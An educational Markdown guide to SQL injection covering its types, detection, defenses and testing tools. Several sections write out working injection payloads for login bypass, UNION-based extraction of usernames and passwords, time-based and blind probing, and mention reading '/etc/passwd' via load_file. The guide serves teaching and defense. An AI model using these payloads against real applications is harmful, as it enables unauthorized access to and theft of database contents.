# 🛡️ SQL Injection (SQLi) – Complete Guide

SQL Injection (SQLi) is one of the most common and dangerous web vulnerabilities.  
It allows attackers to manipulate SQL queries by injecting malicious SQL code into input fields.  
This guide covers everything you need to know: types, techniques, defenses, and resources.

---

## 📚 Table of Contents
1. [What is SQL Injection?](#-what-is-sql-injection)
2. [Types of SQL Injection](#-types-of-sql-injection)
3. [Examples & Payloads](#-examples--payloads)
4. [Detection Techniques](#-detection-techniques)
5. [Defense & Best Practices](#-defense--best-practices)
6. [Tools for SQL Injection](#-tools-for-sql-injection)
7. [Learning Resources](#-learning-resources)
8. [Cheat Sheets & Quick Hints](#-cheat-sheets--quick-hints)

---

## 🔎 What is SQL Injection?

**SQL Injection (SQLi)** is a code injection technique where attackers insert malicious SQL statements into an application's query.  
It can:
- Bypass authentication
- Dump database contents
- Modify or delete data
- Escalate privileges
- Execute remote commands (in some DBMS)

👉 **Risk Level:** Critical  
👉 **OWASP Top 10:** Always listed in *Injection* category

---

## 🧩 Types of SQL Injection

### 1. Classic SQLi
Directly modifies SQL queries via input.
```sql
' OR '1'='1
````

### 2. Blind SQLi

Results are not directly visible; attacker infers info using **boolean** or **time-based** methods.

* **Boolean-based**:

```sql
' AND 1=1 -- ✅
' AND 1=2 -- ❌
```

* **Time-based**:

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

### 3. Error-Based SQLi

Leverages database error messages to extract info.

```sql
' ORDER BY 100 --
```

### 4. Union-Based SQLi

Extracts data by combining results with a `UNION SELECT`.

```sql
' UNION SELECT null, username, password FROM users --
```

### 5. Out-of-Band SQLi

Uses external connections (DNS/HTTP requests) to exfiltrate data.

---

## 💻 Examples & Payloads

### Bypassing Login

```sql
' OR '1'='1 --
' OR '1'='1'#
' OR 1=1/*
```

### Extracting Data (Union)

```sql
' UNION SELECT null, database(), user() --
```

### Identifying Columns

```sql
' ORDER BY 1 --
' ORDER BY 2 --
```

### Time Delay (MySQL)

```sql
' OR SLEEP(5) --
```

---

## 🔍 Detection Techniques

* Input fuzzing (`'`, `"`, `--`, `/*`)
* Monitoring application error messages
* Boolean-based tests (true/false responses)
* Timing attacks
* Automated tools (e.g., **sqlmap**)

---

## 🛡️ Defense & Best Practices

✔️ **Use Prepared Statements (Parameterized Queries)**

```python
# Python Example
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, pwd))
```

✔️ **Use Stored Procedures** (with caution)
✔️ **Whitelist Input Validation**
✔️ **Least Privilege Principle** – Limit DB user rights
✔️ **Web Application Firewalls (WAFs)**
✔️ **Keep DBMS & Frameworks Updated**
✔️ **Error Handling** – Do not reveal SQL errors to users

---

## ⚒️ Tools for SQL Injection

* [sqlmap](https://github.com/sqlmapproject/sqlmap) – Automated SQLi tool
* Burp Suite – Web proxy for testing SQLi
* Havij (old, not recommended but historically used)
* jSQL Injection
* NoSQLMap (for NoSQL injections)

---

## 📘 Learning Resources

* [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
* [PortSwigger SQLi Academy](https://portswigger.net/web-security/sql-injection)
* [HackTheBox Labs](https://www.hackthebox.com/)
* [TryHackMe SQL Injection Room](https://tryhackme.com/)
* [PayloadsAllTheThings (GitHub)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 📝 Cheat Sheets & Quick Hints

### Quick Payloads

```sql
' OR '1'='1 --
' UNION SELECT null, null, version() --
' AND ASCII(SUBSTRING((SELECT database()),1,1))=100 --
```

### Useful SQL Functions

* `database()`
* `user()`
* `version()`
* `load_file('/etc/passwd')`

### Notes

* Always enumerate **columns** and **tables** before extracting data
* Use `information_schema.tables` and `information_schema.columns`
* Be cautious: real-world exploitation is illegal without permission 🚨

---

## 🎨 Final Notes

SQL Injection is **powerful but preventable**.
Understanding how it works helps **developers secure applications** and helps **security professionals test systems responsibly**.

👉 **Rule #1: Never trust user input.**

---
